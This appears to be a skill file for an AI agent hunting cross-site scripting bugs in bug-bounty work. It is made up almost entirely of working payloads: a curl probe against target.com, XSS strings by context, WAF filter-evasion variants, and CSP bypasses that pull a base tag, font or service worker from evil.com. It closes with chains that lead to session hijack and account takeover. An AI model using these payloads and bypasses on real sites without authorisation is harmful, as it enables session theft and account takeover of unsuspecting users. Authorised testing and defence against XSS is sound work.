---
name: hunt-xss
description: XSS — reflected, stored, DOM, postMessage, WAF bypass, CSP bypass. Must demonstrate script execution in victim's context.
---

# XSS HUNTING — 3 BULLETS MAX

**Core:** Malicious script EXECUTES in victim's browser with their session.

## DIFFERENTIAL
```bash
# Normal input → safe
curl -s "https://target.com/search?q=hello" | grep "hello"
# Payload → unescaped = XSS
curl -s "https://target.com/search?q=<script>alert(1)</script>" | grep "<script>"
```

## PAYLOADS (by context)
```
HTML context:    <script>alert(1)</script>  <img src=x onerror=alert(1)>
Attribute:      " onfocus=alert(1) autofocus="  ' onmouseover=alert(1)'
JS context:      '-alert(1)-'  \-alert(1)//
URL context:     javascript:alert(1)
DOM sources:     location.hash, document.referrer, window.name
DOM sinks:       innerHTML, document.write, eval, setTimeout(string)
```

## WAF BYPASS
```
Case: <ScRiPt>  Comment: <scr/**/ipt>  Encoding: &#x3C;script&#x3E;
Double: %253Cscript%253E  SVG: <svg/onload=alert(1)>
Details: <details open ontoggle=alert(1)>
Input: <input onfocus=alert(1) autofocus>
Polyglot: '"><marquee><img src=x onerror=confirm(1)></marquee>
```

## CSP BYPASS
```
JSONP: <script src="https://target.com/jsonp?callback=alert(1)//"></script>
Angular: <script src="angular.min.js"></script><div ng-app>{{constructor.constructor('alert(1)')()}}</div>
Base: <base href="https://evil.com/">  Font: @font-face{src:url('https://evil.com/font')}
Service Worker: navigator.serviceWorker.register('https://evil.com/sw.js')
```

## CHAINS
```
Reflected XSS + cookie theft → Session hijack → ATO       ($500 → $50K)
Stored XSS + admin panel → Privilege escalation → Critical ($1K → $50K)
DOM XSS + OAuth flow → Token theft → ATO                   ($500 → $50K)
Self-XSS + CSRF → Trigger on victim → ATO                  ($200 → $10K)
```

## FALSE POSITIVES
- Payload HTML-encoded (`&lt;`) → not XSS
- In JS string (needs different escape) → not XSS
- Self-XSS only → need to demonstrate on ANOTHER user
- CSP blocks execution → not XSS
